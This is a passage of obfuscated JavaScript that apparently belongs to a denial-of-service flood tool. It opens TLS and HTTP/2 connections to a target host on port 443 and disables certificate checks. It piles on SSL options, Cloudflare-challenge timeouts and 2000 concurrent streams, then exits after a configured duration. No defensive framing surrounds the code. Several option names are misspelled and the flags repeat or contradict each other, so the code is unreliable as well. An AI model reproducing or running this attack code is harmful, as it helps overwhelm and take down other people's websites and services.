        case 1:
          ImKjc = 65535;
          return;
      }
    }
    oDsic.setKeepAlive(true, 600000);
    var ciBjc = (_ciBjc = {}, _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_ciBjc, "host", QMtg.host), "port", 443), "secure", true), "challengesToSolve", Infinity), "resolveWithFullResponse", true), "followAllRedirects", true), "maxRedirects", 10), "clientTimeout", 5000), "clientlareMaxTimeout", 10000), "cloudflareTimeout", 5000), _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_ciBjc, "cloudflareMaxTimeout", 30000), "honorCipherOrder", true), "ALPNProtocols", ["h2", UXdnc.PSpjc, UXdnc.GnqBO, UXdnc.WhOfQ, UXdnc.wSGcV, UXdnc.hSQTA, UXdnc.wViFl]), "secureOptions", UXdnc.eLbdm(UXdnc.eLbdm(UXdnc.PTrSj(UXdnc.AnqsO(UXdnc.hhMGu(UXdnc.ikimV(UXdnc.ilhTL(UXdnc.eLbdm(UXdnc.ilhTL(UXdnc.AnqsO(UXdnc.YpftU(UXdnc.MobsV(UXdnc.PGzwF(UXdnc.Yopub(UXdnc.eLbdm(UXdnc.PTrSj(UXdnc.ikimV(UXdnc.ikimV(UXdnc.sFiRZ(UXdnc.Yopub(UXdnc.LdeAG(UXdnc.ikimV(UXdnc.hhMGu(UXdnc.uCSWN(UXdnc.ilhTL(UXdnc.LnaRN(UXdnc.ilhTL(UXdnc.uCSWN(UXdnc.MobsV(AwCt.constants.SSL_OP_NO_RENEGOTIATION, AwCt.constants.SSL_OP_NO_TICKET), AwCt.constants.SSL_OP_NO_SSLv2), AwCt.constants.SSL_OP_NO_SSLv3), AwCt.constants.SSL_OP_NO_COMPRESSION), AwCt.constants.SSL_OP_NO_RENEGOTIATION), AwCt.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION), AwCt.constants.SSL_OP_TLSEXT_PADDING), AwCt.constants.SSL_OP_ALL), AwCt.constants.SSLcom), AwCt.constants.SSL_OP_NO_SSLv2), AwCt.constants.SSL_OP_NO_SSLv3), AwCt.constants.SSL_OP_NO_TLSv1), AwCt.constants.SSL_OP_NO_TLSv1_1), AwCt.constants.ALPN_ENABLED), AwCt.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION), AwCt.constants.SSL_OP_CIPHER_SERVER_PREFERENCE), AwCt.constants.SSL_OP_LEGACY_SERVER_CONNECT), AwCt.constants.SSL_OP_COOKIE_EXCHANGE), AwCt.constants.SSL_OP_PKCS1_CHECK_1), AwCt.constants.SSL_OP_PKCS1_CHECK_2), AwCt.constants.SSL_OP_SINGLE_DH_USE), AwCt.constants.SSL_OP_SINGLE_ECDH_USE), AwCt.constants.SSL_OP_NO_RENEGOTIATION), AwCt.constants.SSL_OP_NO_TICKET), AwCt.constants.SSL_OP_NO_COMPRESSION), AwCt.constants.SSL_OP_NO_RENEGOTIATION), AwCt.constants.SSL_OP_TLSEXT_PADDING), AwCt.constants.SSL_OP_ALL), AwCt.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION)), "sigals", YySf), "socket", oDsic), "ciphers", UXdnc.weDoV(wZIs.getCiphers().join(":"), EDbg)), "ecdhCurve", UXdnc.dqMec), "host", QMtg.host), "rejectUnauthorized", false), _defineProperty(_defineProperty(_defineProperty(_ciBjc, "servername", QMtg.host), "secureProtocol", [UXdnc.KXGfD, UXdnc.ELHAn, UXdnc.BvEqy, UXdnc.VIRXE]), "sessionTimeout", 5000)),
      EjEjc = wZIs.connect(443, QMtg.host, ciBjc);
    EjEjc.setKeepAlive(true, 60000);
    var Yevjc = ceSs.connect(QMtg.href, _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "protocol", UXdnc.NHsaL), "settings", _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "headerTableSize", 65536), "maxConcurrentStreams", 2000), "initialWindowSize", 65535), "maxHeaderListSize", 65536), "enablePush", false)), "maxSessionMemory", 64000), "maxDeflateDynamicTableSize", 4294967295), "createConnection", function createConnection() {
      return EjEjc;
    }), "socket", oDsic));
    Yevjc.settings(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "headerTableSize", 65536), "maxConcurrentStreams", 2000), "initialWindowSize", 6291456), "maxHeaderListSize", 65536), "enablePush", false));
    Yevjc.on(UXdnc.PlDat, function () {});
    Yevjc.on(UXdnc.mZous, function () {
      Yevjc.destroy();
      oDsic.destroy();
      return;
    });
    Yevjc.on(UXdnc.JisaO, function (kMLgc) {
      Yevjc.destroy();
      oDsic.destroy();
      return;
    });
  });
}
var gJFgc = function gJFgc() {
  return process.exit(1);
};
setTimeout(gJFgc, ojhn.time * 1000);